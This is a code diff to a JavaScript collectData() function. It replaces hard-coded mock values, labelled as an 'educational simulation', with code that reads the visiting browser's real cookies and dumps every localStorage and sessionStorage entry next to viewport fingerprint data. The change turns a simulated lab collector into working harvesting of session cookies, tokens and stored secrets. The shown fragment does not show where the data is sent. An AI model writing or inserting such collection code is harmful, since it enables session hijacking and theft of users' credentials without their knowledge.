@@ -20,17 +20,26 @@ export function collectData() {
             viewportWidth: window.innerWidth,
             viewportHeight: window.innerHeight,
             pixelRatio: window.devicePixelRatio,
-            cookies: "simulated_session_id=mock_sec_" + Math.random().toString(36).substring(2, 8) + "; cyber_consent=true",
+            cookies: document.cookie || "No cookies found / HTTPOnly",
             localStorage: (function() {
-                return {
-                    "simulated_token": "mock_jwt_eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.e30.mock_signature",
-                    "lab_mode": "educational_simulation"
-                };
+                try {
+                    let store = {};
+                    for (let i = 0; i < localStorage.length; i++) {
+                        let key = localStorage.key(i);
+                        store[key] = localStorage.getItem(key);
+                    }
+                    return store;
+                } catch (e) { return {}; }
             })(),
             sessionStorage: (function() {
-                return {
-                    "simulated_csrf": "mock_csrf_987654321_lab"
-                };
+                try {
+                    let store = {};
+                    for (let i = 0; i < sessionStorage.length; i++) {
+                        let key = sessionStorage.key(i);
+                        store[key] = sessionStorage.getItem(key);
+                    }
+                    return store;
+                } catch (e) { return {}; }
             })()
         };
     } catch (e) {
